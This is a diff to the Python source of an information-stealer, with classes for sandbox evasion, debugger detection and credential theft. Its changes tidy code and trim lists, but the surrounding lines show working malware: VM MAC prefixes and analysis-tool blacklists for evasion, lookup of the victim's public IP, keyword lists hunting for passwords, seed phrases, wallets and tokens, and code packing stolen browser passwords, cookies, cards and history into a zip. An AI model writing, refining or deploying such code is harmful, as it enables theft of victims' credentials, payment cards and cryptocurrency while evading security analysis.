@@ -240,11 +240,11 @@ class AntiSandbox:
     ]
 
     VM_MAC_PREFIXES = [
-        "00:05:69",  # VMware
+        "00:05:69",
         "00:0C:29",
         "00:1C:14",
         "00:50:56",
-        "08:00:27",  # VirtualBox
+        "08:00:27",
     ]
 
     @staticmethod
@@ -346,7 +346,7 @@ class Checks:
 
     @staticmethod
     def is_debugged() -> bool:
-        blacklist_programs = ['cheatengine', 'cheat engine', 'x32dbg', 'x64dbg', 'ollydbg', 'windbg', 'ida', 'ida64', 'ghidra', 'radare2', 'radare', 'dbg', 'immunitydbg', 'dnspy', 'softice', 'edb', 'debugger', 'visual studio debugger', 'lldb', 'gdb', 'valgrind', 'hex-rays', 'disassembler', 'tracer', 'debugview', 'procdump', 'strace', 'ltrace', 'drmemory', 'decompiler', 'hopper', 'binary ninja', 'bochs', 'vdb', 'frida', 'api monitor', 'process hacker', 'sysinternals', 'procexp', 'process explorer', 'monitor tool', 'vmmap', 'xperf', 'perfview', 'py-spy', 'strace-log', "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "vmwareuser", "wireshark", "procmon"]
+        blacklist_programs = ['cheatengine', 'cheat engine', 'x32dbg', 'x64dbg', 'ollydbg', 'windbg', 'ida', 'ida64', 'ghidra', 'radare2', 'radare', 'dbg', 'immunitydbg', 'dnspy', 'softice', 'edb']
         try:
             for proc in psutil.process_iter(['name']):
                 try:
@@ -367,7 +367,7 @@ class StealerFunctions:
         info = False
         space = ' '
 
-        def info():
+        def get_info():
             ip_info = ''
             with suppress(Exception):
                 eva = requests.get("https://ipwhois.app/json/").json()
@@ -379,7 +379,7 @@ class StealerFunctions:
             return '''No IP infos.'''
 
         try: 
-            IPinfos = info()
+            IPinfos = get_info()
 
             cpu_count = psutil.cpu_count(logical=True)
             ram_total = round(psutil.virtual_memory().total / (1024**3), 2)
@@ -451,7 +451,7 @@ Public IP infos:
             "acount", "account", "compte", "identifiant", "login", "conta", "contas",
             "personnel", "personal", "perso",
             "banque", "bank", "funds", "fonds", "paypal", "casino", "banco", "saldo",
-            "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor", "seed", "seed phrase", "phrase de récupération", "recovery", "récupération", "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique","passphrase", "phrase secrète", "wallet key", "clé de portefeuille", "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille", "private key", "clé privée", "keystore", "trousseau", "json", "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain", "bnb", "usdt",
+            "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor",
             "telegram", "disc", "discord", "token", "tkn", "webhook", "api", "bot", "tokendisc",
             "key", "clé", "cle", "keys", "private", "prive", "privé", "secret", "steal", "voler", "access", "auth",
             "mdp", "motdepasse", "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd", "passwords", "senha", "senhas",
@@ -460,7 +460,7 @@ Public IP infos:
             "vault", "safe", "locker", "protection", "hidden", "caché", "cache",
             "identity", "identité", "passport", "passeport", "permis",
             "pin", "nip",
-            "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille", "db", "database"
+            "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille", "db", "database",
             "master", "admin", "administrator", "administrateur", "root", "owner", "propriétaire", "proprietaire",
             "keyfile", "keystore", "seedphrase", "recoveryphrase", "privatekey", "publickey",
             "accountdata", "userdata", "logininfo", "seedbackup", "backup", "dados", "documento", "documentos",
@@ -501,11 +501,16 @@ Public IP infos:
     def Browser_Infos(zip_file, browser_choice):
         global number_extentions, number_passwords, number_cookies, number_history, number_downloads, number_cards
         browsers = []
-        number_cards = 0; file_cards = []
-        number_cookies = 0; file_cookies = []
-        number_history = 0; file_history = []
-        number_passwords = 0; file_passwords = []
-        number_downloads = 0; file_downloads = []
+        number_cards = 0
+        file_cards = []
+        number_cookies = 0
+        file_cookies = []
+        number_history = 0
+        file_history = []
+        number_passwords = 0
+        file_passwords = []
+        number_downloads = 0
+        file_downloads = []
         number_extentions = 0
 
         path_appdata_local = Paths().appdata_local
@@ -825,11 +830,6 @@ Public IP infos:
                 profile_path = os.path.join(path, profile)
                 if not os.path.exists(profile_path):
                     continue
-
-            for profile in profiles:
-                profile_path = os.path.join(path, profile)
-                if not os.path.exists(profile_path):
-                    continue
                 
                 if "extentions" in browser_choice:
                     try:
@@ -895,19 +895,19 @@ Public IP infos:
                 file_cards.append("No cards was saved on the victim's computer.")
             file_cards     = "\n".join(file_cards)
         
-        if number_passwords != None:
+        if number_passwords is not None:
             zip_file.writestr(f"Passwords ({number_passwords}).txt", file_passwords)
 
-        if number_cookies != None:
+        if number_cookies is not None:
             zip_file.writestr(f"Cookies ({number_cookies}).txt", file_cookies)
 
-        if number_cards != None:
+        if number_cards is not None:
             zip_file.writestr(f"Cards ({number_cards}).txt", file_cards)
 
-        if number_history != None:
+        if number_history is not None:
             zip_file.writestr(f"Browsing History ({number_history}).txt", file_history)
 
-        if number_downloads != None:
+        if number_downloads is not None:
             zip_file.writestr(f"Download History ({number_downloads}).txt",file_downloads)
 
         return number_extentions, number_passwords, number_cookies, number_history, number_downloads, number_cards
